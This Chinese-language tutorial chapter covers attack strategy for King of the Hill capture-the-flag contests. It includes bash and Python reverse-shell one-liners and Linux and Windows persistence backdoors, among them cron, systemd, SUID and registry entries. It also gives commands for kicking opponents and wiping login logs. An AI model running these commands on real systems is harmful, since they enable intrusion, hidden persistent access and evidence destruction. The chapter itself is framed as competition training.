# KotH攻击策略

### 3.1 快速入侵技巧

在KotH比赛中，速度就是生命。谁能最快攻破靶机，谁就能率先积累分数优势。

#### 3.1.1 信息收集提速

**端口扫描优化：**
```bash
# 快速全端口扫描
nmap -p- --min-rate 10000 -T4 <target>

# 快速服务版本检测
nmap -p 22,80,443,3306,8080 -sV -sC <target>

# 使用masscan进行超快速扫描
masscan -p1-65535 --rate 10000 <target>
```

**Web快速探测：**
```bash
# 快速目录扫描
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -t 50

# 子域名枚举
ffuf -w subdomains.txt -u http://<target> -H "Host: FUZZ.<target>" -t 100
```

**自动化侦察脚本：**
- 使用AutoRecon、nmapAutomator等工具进行全自动信息收集
- 预先准备好自定义的侦察脚本，一键启动全流程扫描

#### 3.1.2 漏洞快速验证

**优先级排序策略：**
1. **已知CVE漏洞**：如果服务版本有已知RCE漏洞，优先尝试
2. **默认凭证**：检查是否使用默认用户名密码
3. **Web应用漏洞**：SQL注入、RCE、文件上传等
4. **配置错误**：错误的权限配置、敏感信息泄露等
5. **密码爆破**：最后考虑，因为耗时较长

**快速验证模板：**
- 准备好常见漏洞的PoC脚本库
- 针对常见服务（SSH、FTP、Web等）准备自动化攻击脚本
- 使用Metasploit的search + exploit快速组合攻击

#### 3.1.3 初始访问加速

**WebShell快速上传：**
- 准备好各种语言的一句话WebShell
- 熟悉常见CMS的漏洞利用方式
- 预先生成各种绕过WAF的WebShell变种

**反弹Shell优化：**
```bash
# Bash反弹（多种备选）
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
bash -i >& /dev/tcp/<ip>/<port> 0>&1

# Python反弹（跨平台）
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# 准备多个端口的监听器，避免端口被占用
```

### 3.2 漏洞利用优先级

#### 3.2.1 按攻击速度排序

| 优先级 | 漏洞类型 | 预计耗时 | 说明 |
|-------|---------|---------|------|
| 1 | 已知RCE漏洞 | 1-5分钟 | 有现成EXP，直接利用 |
| 2 | 默认/弱密码 | 1-3分钟 | 快速尝试常见凭证 |
| 3 | 文件上传漏洞 | 3-10分钟 | 上传WebShell获取访问 |
| 4 | SQL注入 | 5-15分钟 | 从注入到获取Shell |
| 5 | 逻辑漏洞 | 5-20分钟 | 需要分析业务逻辑 |
| 6 | 密码爆破 | 10-30分钟 | 耗时较长，最后考虑 |
| 7 | 0day漏洞 | 不确定 | 比赛中极少遇到 |

#### 3.2.2 按成功率排序

1. **已知CVE漏洞利用**：成功率最高，前提是服务版本匹配
2. **配置错误利用**：如未授权访问、敏感文件泄露等
3. **默认凭证登录**：很多靶机存在默认密码
4. **Web应用漏洞**：SQL注入、命令注入等
5. **密码暴力破解**：成功率取决于密码强度和字典质量

### 3.3 持久化技术

占领靶机后，最重要的是建立持久化访问，确保即使被对手踢出也能快速夺回。

#### 3.3.1 Linux持久化技术

**1. SSH密钥后门**
```bash
# 在目标机器上添加公钥
echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." >> /root/.ssh/authorized_keys

# 设置正确的权限
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

**2. 定时任务后门**
```bash
# crontab反弹shell
(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'") | crontab -

# 系统级定时任务
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > /etc/cron.d/backup
```

**3. 系统服务后门**
```bash
# 创建systemd服务
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

**4. SUID后门**
```bash
# 复制bash并设置SUID
cp /bin/bash /tmp/.bashhidden
chmod u+s /tmp/.bashhidden

# 使用方式：/tmp/.bashhidden -p
```

**5. 内核级Rootkit（高级）**
- Diamorphine：Linux内核Rootkit
- Reptile：现代化内核Rootkit
- 注意：比赛中是否允许使用Rootkit需看规则

#### 3.3.2 Windows持久化技术

**1. 注册表启动项**
```powershell
# 用户级启动项
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# 系统级启动项
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "C:\Windows\System32\backdoor.exe"
```

**2. 计划任务**
```powershell
# 创建每分钟执行的计划任务
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc minute /mo 1 /ru SYSTEM
```

**3. 服务后门**
```powershell
# 创建系统服务
sc create "Windows Update Service" binPath= "C:\Windows\Temp\backdoor.exe" start= auto
sc start "Windows Update Service"
```

### 3.4 防止被踢技巧

当你占领靶机后，其他选手会试图将你踢出。以下技巧可以帮助你守住阵地。

#### 3.4.1 清除对手访问

**1. 踢出SSH会话**
```bash
# 查看当前登录用户
who
w
last

# 踢出指定用户
pkill -kill -t pts/0
fuser -k /dev/pts/0

# 踢出所有其他用户
for user in $(who | grep -v `whoami` | awk '{print $2}'); do pkill -9 -t $user; done
```

**2. 删除对手后门**
```bash
# 检查SSH密钥
cat ~/.ssh/authorized_keys
cat /etc/ssh/sshd_config

# 检查定时任务
crontab -l
ls -la /etc/cron.*
cat /etc/crontab

# 检查SUID文件
find / -perm -4000 -type f 2>/dev/null

# 检查系统服务
systemctl list-unit-files --type=service
```

**3. 更改密码**
```bash
# 修改root密码
echo "root:NewSecurePass123!" | chpasswd

# 锁定其他用户
passwd -l otheruser
usermod -s /sbin/nologin otheruser
```

#### 3.4.2 误导对手

**1. 假flag文件**
```bash
# 创建假的king.txt，放在非标准位置
echo "fake_flag{not_the_real_one}" > /tmp/king.txt

# 修改PS1提示符，制造假象
export PS1="[\u@victim ~]# "
```

**2. 伪造系统信息**
```bash
# 伪造操作系统版本
echo "Ubuntu 22.04.3 LTS" > /etc/issue

# 创建假的漏洞服务，诱导对手浪费时间
```

**3. 日志清理与伪造**
```bash
# 清理登录日志
echo "" > /var/log/wtmp
echo "" > /var/log/btmp
echo "" > /var/log/lastlog

# 清除bash历史
history -c
echo "" > ~/.bash_history

# 伪造日志条目，误导对手调查方向
```

#### 3.4.3 干扰对手操作

**1. 资源耗尽攻击（慎用，可能违反规则）**
```bash
# 占用大量CPU，让对手操作变慢
# 注意：大多数比赛禁止这种操作
```

**2. 网络干扰**
- 修改iptables规则，阻止特定IP访问
- 修改hosts文件，干扰对手的域名解析
- 注意：确保不把自己也挡在外面

---

---

## 📋 内容审核与补充建议

> 针对「KotH攻击策略」部分的内容审核结果：

### 📚 知识点补充
- ⚠️ 缺少knowledge相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
